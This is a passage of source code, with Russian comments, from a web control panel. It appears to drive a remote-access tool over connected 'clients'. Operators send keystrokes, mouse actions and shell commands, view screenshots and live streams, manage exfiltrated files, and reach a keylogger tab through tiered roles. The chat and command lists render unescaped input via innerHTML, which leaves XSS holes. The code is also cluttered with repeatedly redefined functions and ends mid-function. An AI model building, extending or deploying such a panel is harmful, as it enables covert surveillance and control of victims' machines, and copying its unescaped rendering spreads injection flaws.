document.addEventListener('DOMContentLoaded', function() {
    // Обработка нажатий клавиш клавиатуры
    const keys = document.querySelectorAll('.key');
    keys.forEach(key => {
        key.addEventListener('click', function() {
            const clientId = document.getElementById('controlClientSelect').value;
            const keyValue = this.getAttribute('data-key');
            sendCommand(clientId, 'keypress:' + keyValue);
        });
    });

    // Инициализация джойстика
    const joystick = document.getElementById('joystick');
    const joystickHead = joystick.querySelector('.joystick-head');
    let isDragging = false;

    joystick.addEventListener('mousedown', startDrag);
    joystick.addEventListener('touchstart', startDrag);

    document.addEventListener('mousemove', drag);
    document.addEventListener('touchmove', drag);

    document.addEventListener('mouseup', stopDrag);
    document.addEventListener('touchend', stopDrag);

    function startDrag(e) {
        isDragging = true;
        // Предотвращаем действие по умолчанию для touch событий
        if (e.type === 'touchstart') {
            e.preventDefault();
        }
        drag(e);
    }

    function drag(e) {
        if (!isDragging) return;

        const clientId = document.getElementById('controlClientSelect').value;
        const rect = joystick.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;

        let clientX, clientY;

        if (e.type === 'mousemove') {
            clientX = e.clientX;
            clientY = e.clientY;
        } else if (e.type === 'touchmove') {
            clientX = e.touches[0].clientX;
            clientY = e.touches[0].clientY;
        }

        const deltaX = clientX - centerX;
        const deltaY = clientY - centerY;

        // Ограничиваем движение джойстика круглой областью
        const distance = Math.min(Math.sqrt(deltaX * deltaX + deltaY * deltaY), rect.width / 2);
        const angle = Math.atan2(deltaY, deltaX);

        const limitedX = Math.cos(angle) * distance;
        const limitedY = Math.sin(angle) * distance;

        // Перемещаем головку джойстика
        joystickHead.style.transform = `translate(calc(-50% + ${limitedX}px), calc(-50% + ${limitedY}px))`;

        // Определяем направление и отправляем команду
        let direction = '';
        if (Math.abs(deltaX) > Math.abs(deltaY)) {
            direction = deltaX > 0 ? 'right' : 'left';
        } else {
            direction = deltaY > 0 ? 'down' : 'up';
        }

        sendCommand(clientId, 'mouse:' + direction);
    }

    function stopDrag() {
        if (!isDragging) return;
        isDragging = false;
        // Возвращаем головку джойстика в центр
        joystickHead.style.transform = 'translate(-50%, -50%)';
    }

    // Обработка нажатий кнопок мыши
    const mouseButtons = document.querySelectorAll('.mouse-btn');
    mouseButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            const clientId = document.getElementById('controlClientSelect').value;
            const button = this.getAttribute('data-button');
            sendCommand(clientId, 'mouseclick:' + button);
        });
    });

    // Функция отправки команды (заглушка - нужно реализовать под вашу систему)
    function sendCommand(clientId, command) {
        console.log(`Отправка команды клиенту ${clientId}: ${command}`);
        // Здесь должен быть код для отправки команды на сервер
        // Например, с помощью fetch или WebSocket
    }
});
</script>
<style>
.history-header {

    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
}

.btn-danger {
    margin-top: -7px;
    background: #dc3545;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background 0.3s ease;
}

.btn-danger:hover {
    background: #c82333;
}

.history-entry {
    background: #1e1e1e;
    padding: 20px;
    margin-bottom: 10px;
    border-radius: 20px;
}
</style>

<script>
function clearHistory() {
    if(!confirm('Вы уверены, что хотите полностью удалить историю?')) return;

    fetch('clear_history.php', {
        method: 'POST'
    })
    .then(response => {
        if(response.ok) {
            document.getElementById('historyContent').innerHTML = '<p>История пуста.</p>';
            showToast('success', 'История успешно очищена', false, 'fa-check-circle');
        } else {
            throw new Error('Ошибка очистки истории');
        }
    })
    .catch(error => {
        showToast('error', error.message, true, 'fa-times-circle');
        console.error(error);
    });
}
</script>

<!-- Чат -->
<div id="chat" class="tab-content" style="display:none;">
    <div class="chat-container">
        <div class="chat-header">
            <h2><i class="fa fa-comments"></i> Удаленный чат</h2>
            <div class="chat-toggle">
                <button class="chat-toggle-btn" id="btnChatoff"
                    onclick="toggleChat('chatoff')"
                    title="Скрыть">
                    <i class="fa fa-eye-slash"></i>
                </button>
                <button class="chat-toggle-btn" id="btnChaton"
                    onclick="toggleChat('chaton')"
                    title="Показать">
                    <i class="fa fa-eye"></i>
                </button>
            </div>
            <div class="client-selector">
                <select id="chatClientSelect" class="chat-select" onchange="loadChat()">
                    <option value="">Выберите клиента</option>
                    <?php foreach ($data['clients'] as $client_id => $client): ?>
                        <option value="<?= htmlspecialchars($client_id) ?>">
                            <?= htmlspecialchars($client_id) ?>
                        </option>
                    <?php endforeach; ?>
                </select>
            </div>
        </div>

        <div class="chat-messages" id="chatWindow">
            <!-- Сообщения будут здесь -->
        </div>

        <div class="chat-input">
            <input type="text" id="chatInput" placeholder="Введите сообщение...">
            <button class="chat-send-btn" onclick="sendMessage()">
                <i class="fa fa-paper-plane"></i>
            </button>
        </div>
    </div>
</div>


<script>
    // Функция для обновления содержимого блока с историей вывода
    function refreshHistory() {
        // Выполняем запрос на получение текущей страницы
        fetch(window.location.href)
            .then(response => response.text())
            .then(html => {
                // Парсим HTML и находим новый блок истории по id "historyContent"
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const newContent = doc.getElementById('historyContent');
                if(newContent) {
                    // Обновляем содержимое текущего блока истории
                    document.getElementById('historyContent').innerHTML = newContent.innerHTML;
                }
            })
            .catch(error => console.error('Ошибка обновления истории:', error));
    }

    // Автообновление каждые 10 секунд
    setInterval(refreshHistory, 2000);
</script>

<!-- Вкладка "Заготовленные команды" -->
<div id="commands" class="tab-content" style="display:none;">
    <h2><i class="fas fa-list"></i> Заготовленные команды</h2>
    <div class="command-manager">
        <div class="client-select">

            <select id="commandClientSelect">
                <?php foreach($data['clients'] as $client_id => $client): ?>
                    <option value="<?php echo htmlspecialchars($client_id); ?>"><?php echo htmlspecialchars($client_id); ?></option>
                <?php endforeach; ?>
            </select>
        </div>
        <button class="btn-add-command" onclick="showCommandModal()">
            <i class="fas fa-plus"></i> Добавить команду
        </button>
        <ul id="commandList"></ul>
    </div>
</div>

<!-- Модальное окно добавления команды -->
<div id="commandModals" class="modals">
    <div class="modals-content">
        <span class="close" onclick="closeCommandModal()">&times;</span>
        <h3>Новая команда</h3>
        <div class="form-group">
            <label>Команда:</label>
            <input type="text" id="cmdName" placeholder="Пример: tasklist">
        </div>
        <div class="form-group">
            <label>Описание:</label>
            <input type="text" id="cmdDesc" placeholder="Пример: Показать список процессов">
        </div>
        <div class="form-group">
            <label>
                <input type="checkbox" id="cmdNoDel"> Запретить удаление
            </label>
        </div>
        <div class="modals-actions">
            <button class="btn-cancel" onclick="closeCommandModal()">Отмена</button>
            <button class="btn-confirm" onclick="processCommand()">Добавить</button>
        </div>
    </div>
</div>
 <script>
        // Определяем доступные вкладки на основе роли пользователя
        const userRole = '<?php echo $userRole; ?>';
        const rolePermissions = {
            'admin lead': ['manage', 'history', 'commands', 'control', 'remote-cmd', 'chat', 'fun', 'taskManager', 'files', 'update', 'audio-tab', 'info', 'file_manager', 'stream_view', 'users', 'logout', 'keylogger'],
            'admin': ['manage', 'history', 'commands', 'control', 'remote-cmd', 'chat', 'fun', 'taskManager', 'files', 'update', 'audio-tab', 'info', 'file_manager', 'stream_view', 'logout', 'keylogger'],
            'Master': ['manage', 'control', 'chat', 'fun', 'taskManager', 'audio-tab', 'info', 'stream_view', 'logout', 'keylogger'],
            'Worker': ['manage', 'control', 'chat', 'taskManager', 'info', 'logout'],
            'Ml. Worker': ['manage', 'info', 'logout', 'stream_view']
        };

        // Функция проверки доступа
        function hasAccess(tabName) {
            return rolePermissions[userRole] && rolePermissions[userRole].includes(tabName);
        }

        // Функция показа вкладки
        function showTab(tabName) {
            // Проверяем доступ
            if (!hasAccess(tabName)) {
                showToast('error', 'У вас нет доступа к этой вкладке', true, 'fa-times-circle');
                return;
            }

            // Скрыть все вкладки
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = "none";
            });

            // Убрать активное состояние со всех пунктов меню
            document.querySelectorAll('.menu-item').forEach(item => {
                item.classList.remove("active");
            });

            // Показать выбранную вкладку
            const tab = document.getElementById(tabName);
            if (tab) {
                tab.style.display = "block";
            }

            // Активировать соответствующий пункт меню
            const menuItem = document.querySelector(`.menu-item[data-tab="${tabName}"]`);
            if (menuItem) {
                menuItem.classList.add('active');
            }

            // Закрыть сайдбар на мобильном устройстве после выбора
            if (window.innerWidth <= 1200) {
                closeSidebar();
            }

            // Для вкладки файлов обновить список
            if(tabName === 'files') {
                refreshFileList();
            }
        }

        // Показать вкладку по умолчанию при загрузке
        window.onload = function() {
            // Показываем первую доступную вкладку
            const firstAllowedTab = rolePermissions[userRole][0];
            if (firstAllowedTab) {
                showTab(firstAllowedTab);
            }

            // Загрузить команды, если эта функция существует
            if (typeof loadCommands === 'function') {
                loadCommands();
            }
        }

        // Функции для работы с сайдбаром
        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            const overlay = document.getElementById('sidebar-overlay');
            const mainContent = document.getElementById('main-content');

            sidebar.classList.toggle('active');
            overlay.classList.toggle('active');

            if (window.innerWidth > 1200) {
                sidebar.classList.toggle('hidden');
                mainContent.classList.toggle('expanded');
            }
        }

        function closeSidebar() {
            const sidebar = document.getElementById('sidebar');
            const overlay = document.getElementById('sidebar-overlay');
            const mainContent = document.getElementById('main-content');

            sidebar.classList.remove('active');
            overlay.classList.remove('active');

            if (window.innerWidth > 1200) {
                mainContent.classList.remove('expanded');
            }
        }

        // Обработчик изменения размера окна
        window.addEventListener('resize', function() {
            if (window.innerWidth > 1200) {
                closeSidebar();
            }
        });

        // Функция для показа уведомлений
        function showToast(type, message, autoHide = true, icon = 'fa-info-circle') {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `<i class="fas ${icon}"></i> ${message}`;
            document.body.appendChild(toast);

            setTimeout(() => {
                toast.classList.add('show');
            }, 100);

            if (autoHide) {
                setTimeout(() => {
                    toast.classList.remove('show');
                    setTimeout(() => {
                        document.body.removeChild(toast);
                    }, 500);
                }, 3000);
            }
        }

        // Ваши существующие функции
        function sendCommand(clientId, command) {
            fetch('api.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=set_command&client_id=${encodeURIComponent(clientId)}&command=${encodeURIComponent(command)}`
            }).then(response => {
                if (response.ok) {
                    showToast('success', 'Команда отправлена успешно!', false, 'fa-check-circle');
                    console.log('Команда отправлена:', command);
                } else {
                    showToast('error', 'Команда не отправлена', true, 'fa-times-circle');
                    console.error('Ошибка отправки команды');
                }
            }).catch(error => {
                showToast('error', 'Ошибка: ' + error, true, 'fa-times-circle');
                console.error('Ошибка:', error);
            });
        }

        function openModal(imageSrc) {
            document.getElementById("modalImage").src = imageSrc;
            document.getElementById("screenshotModal").style.display = "flex";
        }

        function closeModal() {
            document.getElementById("screenshotModal").style.display = "none";
        }

        window.onclick = function(event) {
            var modal = document.getElementById("screenshotModal");
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
    </script>
<script>
// Модальное окно для команд
function showCommandModal() {
    document.getElementById('commandModals').style.display = 'flex';
}

function closeCommandModal() {
    document.getElementById('commandModals').style.display = 'none';
    resetCommandForm();
}

function resetCommandForm() {
    document.getElementById('cmdName').value = '';
    document.getElementById('cmdDesc').value = '';
    document.getElementById('cmdNoDel').checked = false;
}
// Обработка добавления команды
function processCommand() {
    const cmdName = document.getElementById('cmdName').value.trim();
    const cmdDesc = document.getElementById('cmdDesc').value.trim();
    const noDel = document.getElementById('cmdNoDel').checked;

    if(!cmdName) {
        showNotification('Введите название команды!', true);
        return;
    }

    let fullCommand = cmdName;
    if(noDel) fullCommand += '-nodel';
    if(cmdDesc) fullCommand += `"${cmdDesc}"`;

    fetch('index.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'cmd_action=add_command&command=' + encodeURIComponent(fullCommand)
    })
    .then(response => response.json())
    .then(data => {
        if(data.status === 'success') {
            userCommands = data.commands;
            renderCommandList();
            closeCommandModal();
            showNotification('Команда добавлена', false, 'fa-check-circle');
        } else {
            showNotification(data.message, true, 'fa-times-circle');
        }
    })
    .catch(error => {
        console.error('Ошибка добавления команды:', error);
    });
}

    // Отправка команды (логика не изменена)
    function sendCommand(clientId, command) {
        fetch('api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `action=set_command&client_id=${encodeURIComponent(clientId)}&command=${encodeURIComponent(command)}`
        }).then(response => {
            if (response.ok) {
                showToast('success', 'Команда отправленна успешна!', false, 'fa-check-circle');
                console.log('Команда отправлена:', command);
            } else {
                showToast('error', 'Команда неотправлена', true, 'fa-times-circle');
                console.error('Ошибка отправки команды');
            }
        }).catch(error => {
            showNotification('Ошибка: ' + error, true, 'fa-times-circle');
            console.error('Ошибка:', error);
        });
    }
    // Работа с модальным окном для скриншота
    function openModal(imageSrc) {
        document.getElementById("modalImage").src = imageSrc;
        document.getElementById("screenshotModal").style.display = "flex";
    }
    function closeModal() {
        document.getElementById("screenshotModal").style.display = "none";
    }
    window.onclick = function(event) {
        var modal = document.getElementById("screenshotModal");
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }

     // Функция показа вкладки


        // Показать вкладку по умолчанию при загрузке
        window.onload = function() {
            showTab('manage');
            // Загрузить команды, если эта функция существует
            if (typeof loadCommands === 'function') {
                loadCommands();
            }
        }

        // Обработчик изменения размера окна
        window.addEventListener('resize', function() {
            if (window.innerWidth > 1200) {
                closeSidebar();
            }
        });

        // Функция для демонстрации работы (в реальном коде будет заменена)
        function refreshFileList() {
            console.log("Обновление списка файлов...");
        }
    // Работа с пользовательскими командами (загруженными из файла)
    var userCommands = <?php echo json_encode($userCommands); ?>;

    // Функция для отрисовки списка команд с учетом описания и флага "nodel"
    function renderCommandList() {
        const list = document.getElementById('commandList');
        list.innerHTML = '';
        userCommands.forEach((cmd, index) => {
            let baseCmd = cmd;
            let description = '';
            let noDel = false;

            // Если присутствует описание в кавычках, отделяем его
            if (baseCmd.indexOf('"') !== -1) {
                const parts = baseCmd.split('"');
                baseCmd = parts[0]; // до кавычек
                description = parts[1]; // то, что в кавычках
            }

            // Если в baseCmd присутствует суффикс -nodel, удаляем его и ставим флаг
            if (baseCmd.endsWith('-nodel')) {
                baseCmd = baseCmd.slice(0, -6);
                noDel = true;
            }

            // Формируем элементы для отображения команды и описания
            let nameHTML = `<span class="command-name">${baseCmd}</span>`;
            let descHTML = description ? `<span class="command-desc">${description}</span>` : '';

            const li = document.createElement('li');
            li.className = 'command-item';
            // Если noDel равно true, не отображаем кнопку удаления
            li.innerHTML = `
                <div class="command-info">${nameHTML}${descHTML}</div>
                <div class="command-actions">
                    <button onclick="sendPresetCommand(${index})"><i class="fas fa-paper-plane"></i></button>
                    ${noDel ? '' : `<button onclick="deleteCommand(${index})"><i class="fas fa-trash"></i></button>`}
                </div>`;
            list.appendChild(li);
        });
    }

    // Обновляем список команд с сервера
    function loadCommands() {
        fetch('index.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'cmd_action=get_commands'
        })
        .then(response => response.json())
        .then(data => {
            userCommands = data;
            renderCommandList();
        })
        .catch(error => {
            console.error('Ошибка загрузки команд:', error);
        });
    }

    // Добавление новой команды
    function addCommand() {
        const newCmdInput = document.getElementById('newCommand');
        const cmd = newCmdInput.value.trim();
        if(cmd !== '') {
            fetch('index.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'cmd_action=add_command&command=' + encodeURIComponent(cmd)
            })
            .then(response => response.json())
            .then(data => {
                if(data.status === 'success') {
                    userCommands = data.commands;
                    renderCommandList();
                    newCmdInput.value = '';
                    showNotification('Команда добавлена', false, 'fa-check-circle');
                } else {
                    showNotification(data.message, true, 'fa-times-circle');
                }
            })
            .catch(error => {
                console.error('Ошибка добавления команды:', error);
            });
        }
    }

    // Удаление команды по индексу
    function deleteCommand(index) {
        fetch('index.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'cmd_action=delete_command&index=' + encodeURIComponent(index)
        })
        .then(response => response.json())
        .then(data => {
            if(data.status === 'success') {
                userCommands = data.commands;
                renderCommandList();
                showNotification('Команда удалена', false, 'fa-check-circle');
            } else {
                showNotification(data.message, true, 'fa-times-circle');
            }
        })
        .catch(error => {
            console.error('Ошибка удаления команды:', error);
        });
    }

    // Отправка выбранной команды выбранному клиенту
    function sendPresetCommand(index) {
        const clientSelect = document.getElementById('commandClientSelect');
        const clientId = clientSelect.value;
        if(!clientId) {
            showNotification('Нет выбранного клиента', true, 'fa-times-circle');
            return;
        }
        let cmd = userCommands[index];
        // Удаляем пояснение (если есть) и суффикс -nodel
        if (cmd.indexOf('"') !== -1) {
            cmd = cmd.split('"')[0];
        }
        if (cmd.endsWith('-nodel')) {
            cmd = cmd.slice(0, -6);
        }
        sendCommand(clientId, cmd);
    }
</script>



<!-- Стили -->
<style>
.chat-toggle {
    display: flex;
    gap: 10px;
    margin-bottom: 10px;
}

.chat-toggle-btn {
    background: none;
    border: none;
    color: #e0e0e0;
    font-size: 1.5em;
    cursor: pointer;
    transition: color 0.3s ease;
}

.chat-toggle-btn:hover {
    color: #1a1a1a;
}

/* Стиль активной кнопки */
.chat-toggle-btn.active {
    color: #1a1a1a;
    border-bottom: 2px solid #1a1a1a;
}


#chatInput {
    flex: 1;
    padding: 12px;
    background: #252525;
    border: 1px solid #3d3d3d;
    border-radius: 8px;
    color: #e0e0e0;
}

.chat-send-btn {
    background: #1a1a1a;
    color: white;
    border: none;
    padding: 12px 20px;
    border-radius: 8px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.chat-send-btn:hover {
    background: #4654d1;
}

.message {
    padding: 10px 15px;
    margin: 8px 0;
    border-radius: 8px;
    background: #1e1e1e;
    max-width: 80%;
    word-wrap: break-word;
}

.message.admin {
    background: #252525;
    margin-left: auto;
    text-align: right;
}

.message.client {
    background: #1e1e1e;
    margin-right: auto;
    text-align: left;
}

.message-time {
    font-size: 0.8em;
    color: #888;
    margin-right: 10px;
}

.message-sender {
    font-weight: bold;
}

    .chat-container {
        background: #121212;
        border-radius: 12px;
        padding: 20px;
        height: 70vh;
        display: flex;
        flex-direction: column;
    }
    .chat-header {
        margin-bottom: 20px;
        border-bottom: 1px solid #252525;
        padding-bottom: 15px;
        display: flex;
        align-items: center;
        justify-content: space-between;
    }
    .chat-header h2 {
        margin: 0;
        font-size: 1.5em;
        color: #fff;
    }
    .chat-toggle {
        display: flex;
        gap: 10px;
    }
    .chat-toggle-btn {
        background: none;
        border: none;
        color: #e0e0e0;
        font-size: 1.5em;
        cursor: pointer;
        transition: color 0.3s ease;
    }
    .chat-toggle-btn:hover {
        color: #51a1a1a;
    }
    .chat-select {
        width: 100%;
        padding: 10px;
        background: #252525;
        border: 1px solid #3d3d3d;
        border-radius: 8px;
        color: #e0e0e0;
        margin-top: 10px;
    }
    .chat-messages {
        flex: 1;
        overflow-y: auto;
        padding: 15px;
        background: #0a0a0a;
        border-radius: 8px;
        margin-bottom: 15px;
    }
    .chat-input {
        display: flex;
        gap: 10px;
    }
    #chatInput {
        flex: 1;
        padding: 12px;
        background: #252525;
        border: 1px solid #3d3d3d;
        border-radius: 8px;
        color: #e0e0e0;
    }
    .chat-send-btn {
        background: #1a1a1a;
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    .chat-send-btn:hover {
        background: #40444d;
    }
    .message {
        padding: 10px 15px;
        margin: 8px 0;
        border-radius: 8px;
        background: #1e1e1e;
        max-width: 80%;
    }
    .message.admin {
        background: #252525;
        margin-left: auto;
        text-align: right;
    }
    .message.client {
        background: #1e1e1e;
        margin-right: auto;
        text-align: left;
    }
    .message-time {
        font-size: 0.8em;
        color: #888;
        margin-right: 10px;
    }
    .message-sender {
        font-weight: bold;
    }
</style>

<!-- Скрипты -->
<script>
function toggleChat(action) {
    const selectedClient = document.getElementById('chatClientSelect').value;
    if (!selectedClient) {
        showToast('error', 'Сначала выберите клиента');
        return;
    }

    sendCommand(selectedClient, action);
    const message = action === 'chaton' ?
        'Команда для показа чата отправлена' :
        'Команда для скрытия чата отправлена';
    showToast('info', message);
}
// Функция для отправки команды на сервер и выделения нажатой кнопки
function toggleChatCommand(button, command) {
    // Удаляем класс active у всех кнопок чата
    document.querySelectorAll('.chat-toggle-btn').forEach(btn => btn.classList.remove('active'));

    // Добавляем класс active к нажатой кнопке
    button.classList.add('active');

    // Отправляем команду на сервер
    sendCommand(document.getElementById('<?php echo htmlspecialchars($client_id); ?>').value, command);
    // Здесь вместо document.getElementById... можно использовать сохраненный client_id, если он известен на стороне скрипта.
}

    // Функция загрузки сообщений
    function loadChat() {
        const clientId = document.getElementById("chatClientSelect").value;
        if (!clientId) return;

        fetch(`get_messages.php?client_id=${clientId}`)
            .then(response => response.json())
            .then(data => {
                const chatWindow = document.getElementById("chatWindow");
                chatWindow.innerHTML = '';

                data.messages.forEach(msg => {
                    const div = document.createElement('div');
                    // Применяем класс в зависимости от типа (admin или client)
                    div.className = `message ${msg.type}`;

                    const time = new Date(msg.timestamp * 1000).toLocaleTimeString();
                    div.innerHTML = `
                        <span class="message-sender">${msg.sender}</span><br>
                        <span class="message-text">${msg.text}</span><br>
                        <span class="message-time">${time}</span>
                    `;
                    chatWindow.appendChild(div);
                });

                chatWindow.scrollTop = chatWindow.scrollHeight;
            });
    }

    // Функция отправки сообщения
    function sendMessage() {
        const input = document.getElementById("chatInput");
        const message = input.value.trim();
        const clientId = document.getElementById("chatClientSelect").value;
        const sender = "Админ"; // Здесь можно изменить или использовать clientId

        if (!message || !clientId) return;

        fetch('send_message.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                client_id: clientId,
                message: message,
                sender: sender
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                loadChat();
                input.value = '';
            }
        });
    }

    // Функция отправки команды для скрытия чата
    function hideChatCommand() {
        fetch('send_command.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: "chatoff" })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                document.getElementById("chat").style.display = "none";
            }
        });
    }

    // Функция отправки команды для показа чата
    function showChatCommand() {
        fetch('send_command.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: "chaton" })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                document.getElementById("chat").style.display = "block";
            }
        });
    }

    // Автообновление чата каждые 10 секунд
    setInterval(loadChat, 1000);
</script>



        <div id="files" class="tab-content" style="display: none;">
        <h2><i class="fas fa-folder-open" aria-hidden="true"></i> Файлы сервера</h2>
    <div class="file-manager">
        <div class="file-toolbar">
            <div class="sort-controls">
                <button class="sort-btn active" data-sort="date">По дате</button>
                <button class="sort-btn" data-sort="name">По имени</button>
                <button class="sort-btn" data-sort="size">По размеру</button>
            </div>
            <button class="refresh-btn" onclick="refreshFiles()">
                <i class="fas fa-sync-alt"></i>
                Обновить
            </button>
        </div>

        <div class="file-grid">
            <!-- Сюда будет загружаться список файлов -->
        </div>
    </div>
</div>

<script>
// Универсальная функция для показа уведомлений
function showNotification(message, isError = false) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.className = `notification${isError ? ' error' : ''} show`;

    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// Функция для toast-уведомлений
function showToast(type, message) {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' :
                       type === 'error' ? 'fa-times-circle' :
                       'fa-info-circle'}></i>
        ${message}
    `;

    container.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}
function downloadFile(fileName) {
    // Генерируем путь для скачивания
    const filePath = 'download.php?file=' + encodeURIComponent(fileName);

    // Открываем ссылку для скачивания через fetch
    fetch(filePath)
        .then(response => {
            if (response.ok) {
                return response.blob(); // Преобразуем ответ в Blob
            } else {
                throw new Error('Ошибка при скачивании файла');
            }
        })
        .then(blob => {
            const url = URL.createObjectURL(blob); // Создаем URL для скачивания
            showToast('info', 'Скачивание началось');
            const a = document.createElement('a');
            a.href = url;
            a.download = fileName; // Имя файла
            document.body.appendChild(a);
            a.click(); // Имитируем клик для скачивания
            document.body.removeChild(a); // Удаляем ссылку
            URL.revokeObjectURL(url); // Освобождаем URL
        })
        .catch(error => {
            console.error('Ошибка при скачивании:', error);
        });
}
document.querySelectorAll('.sort-btn').forEach(btn => {
    btn.addEventListener('click', function() {
        // Убираем активное состояние у всех кнопок
        document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
        // Делаем текущую кнопку активной
        this.classList.add('active');

        // Получаем тип сортировки
        const sortType = this.dataset.sort;
        sortFiles(sortType);
    });
});

function sortFiles(type) {
    const grid = document.querySelector('.file-grid');
    const files = Array.from(grid.children);

    files.sort((a, b) => {
        const aData = {
            name: a.dataset.name.toLowerCase(),
            size: parseInt(a.dataset.size),
            modified: parseInt(a.dataset.modified)
        };

        const bData = {
            name: b.dataset.name.toLowerCase(),
            size: parseInt(b.dataset.size),
            modified: parseInt(b.dataset.modified)
        };

        switch(type) {

            case 'name':
                return aData.name.localeCompare(bData.name);

            case 'size':
                return aData.size - bData.size;
            case 'date':
            default:
                return bData.modified - aData.modified;

        }
    });

    // Очищаем сетку и добавляем отсортированные файлы
    grid.innerHTML = '';
    files.forEach(file => grid.appendChild(file));
}
 // Функция переключения сайдбара на мобильных устройствах
        function toggleSidebar() {
            const sidebar = document.querySelector('.sidebar');
            const overlay = document.querySelector('.sidebar-overlay');
            sidebar.classList.toggle('active');
            overlay.classList.toggle('active');
        }


// Функция для открытия сайдбара
function openSidebar() {
    document.querySelector('.sidebar').classList.add('active');
    document.querySelector('.sidebar-overlay').classList.add('active');
    document.querySelector('.menu-toggle').style.display = 'none';
}

// Функция для закрытия сайдбара
function closeSidebar() {
    document.querySelector('.sidebar').classList.remove('active');
    document.querySelector('.sidebar-overlay').classList.remove('active');
    document.querySelector('.menu-toggle').style.display = 'block';
}

// Обработчик клика по кнопке меню
document.querySelector('.menu-toggle').addEventListener('click', openSidebar);

// Обработчик клика по оверлею для закрытия сайдбара
document.querySelector('.sidebar-overlay').addEventListener('click', closeSidebar);
window.addEventListener('resize', function() {
    if (window.innerWidth > 1200) {
        // На больших экранах сайдбар всегда виден, скрываем кнопку
        document.querySelector('.menu-toggle').style.display = 'none';
    } else if (!document.querySelector('.sidebar').classList.contains('active')) {
        // На маленьких экранах, если сайдбар закрыт, показываем кнопку
        document.querySelector('.menu-toggle').style.display = 'block';
    }
});

// При загрузке страницы проверяем размер экрана
window.addEventListener('load', function() {
    if (window.innerWidth > 1200) {
        document.querySelector('.menu-toggle').style.display = 'none';
    }
});

// Удаление файла
async function deleteFile(filename, category) {
    if (confirm(`Вы уверены, что хотите удалить файл "${filename}"?`)) {
        try {

            const response = await fetch('delete_file.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `filename=${encodeURIComponent(filename)}&category=${encodeURIComponent(category)}`
            });
            const result = await response.json();

            if (result.success) {
                showToast('success', `Файл ${filename} удален`, false);
                refreshFiles(); // Обновляем список файлов
            } else {
                showNotification(`Ошибка: ${result.message}`, true);
            }
        } catch (error) {
                showToast('error', 'error');
            showNotification('Ошибка сети', true);
            console.error('Ошибка:', error);
        }
    }
}

// Скачивание файла
function downloadFile(filename, category) {
    const filePath = (category === 'screenshot' ? 'скриншоты/' : 'data/') + filename;
    window.location.href = filePath;
}

// Обновление списка файлов
async function refreshFiles() {
    showToast('info', 'Запрос файлов...');
    const refreshBtn = document.querySelector('.refresh-btn');
    const fileGrid = document.querySelector('.file-grid');

    // Анимация загрузки
    refreshBtn.classList.add('loading');
    refreshBtn.disabled = true;

    try {
        const response = await fetch('get_files.php');
        const html = await response.text();
        fileGrid.innerHTML = html;
    } catch (error) {
        showToast('error', 'Ошибка');
        showNotification('Ошибка при обновлении файлов', true);
        console.error('Ошибка:', error);
    } finally {
        showToast('success', 'Файлы успешно обновлены!');
        // Убираем анимацию загрузки
        refreshBtn.classList.remove('loading');
        refreshBtn.disabled = false;
    }
}

// Автоматическое обновление списка файлов при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    refreshFiles();
});

// Обновление списка файлов
async function refreshFiles() {
    const refreshBtn = document.querySelector('.refresh-btn');
    const fileGrid = document.querySelector('.file-grid');

    // Анимация загрузки
    refreshBtn.classList.add('loading');
    refreshBtn.disabled = true;

    try {
        const response = await fetch('get_files.php');
        const html = await response.text();
        fileGrid.innerHTML = html;
    } catch (error) {
        showNotification('Ошибка при обновлении файлов', true);
        console.error('Ошибка:', error);
    } finally {
        // Убираем анимацию загрузки
        refreshBtn.classList.remove('loading');
        refreshBtn.disabled = false;
    }
}

// Автоматическое обновление списка файлов при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    refreshFiles();
});
// Открытие модального окна с изображением
function openModal(imageSrc) {
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.innerHTML = `
        <span class="close-modal" onclick="closeModal()">&times;</span>
        <img src="${imageSrc}" class="modal-content">
    `;
    document.body.appendChild(modal);
    modal.style.display = 'flex';
}

// Закрытие модального окна
function closeModal() {
    const modal = document.querySelector('.modal');
    if (modal) {
        modal.remove();
    }
}

// Закрытие модального окна при клике вне изображения
window.addEventListener('click', function(event) {
    const modal = document.querySelector('.modal');
    if (modal && event.target === modal) {
        closeModal();
    }
});

</script>
<script>
function showToast(type, message) {
